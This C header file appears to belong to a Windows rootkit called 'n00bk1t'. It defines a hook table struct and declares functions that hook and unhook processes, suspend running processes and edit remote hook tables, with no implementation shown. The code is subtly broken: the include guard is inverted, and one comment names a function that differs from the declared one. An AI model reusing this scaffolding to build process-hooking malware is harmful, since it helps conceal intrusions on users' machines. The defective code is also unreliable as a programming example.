// standard includes 
#include <winsock2.h>
#include <windows.h>
#include <time.h>

// own includes
#include "ntdll.h"

// suspendproc passed to n00bk1t_EnumAndSuspendRunningProcesses()
typedef void (*SUSPENDPROC)(HANDLE);

///
///-> HookTable
///
typedef struct 
{
	LPSTR	lpLibraryName;
	LPSTR	lpFunctionName;
	LPVOID	lpOldFunction;
	DWORD   dwOldFunctionSize; // we need this for easy unhooking
	LPVOID  lpNewFunction;
	LPVOID  lpFunctionAddress; // we need this for ntvirtualmemory, makes it a bit faster
}
HOOKTABLE,*PHOOKTABLE;

#ifdef __N00BK1T__
#define __N00BK1T__

void n00bk1t_DoHook(HANDLE);
void n00bk1t_HookProcess(HANDLE);
void n00bk1t_UpdateProcessConfig(HANDLE);
void n00bk1t_UnHookProcess(HANDLE);
void n00bk1t_EnumAndSuspendResumeRunningProcesses(SUSPENDPROC);
void n00bk1t_HookCurrentProcess(void);
void n00bk1t_CleanRemoteHookTable(HANDLE);
void n00bk1t_Main(LPSTR);

#endif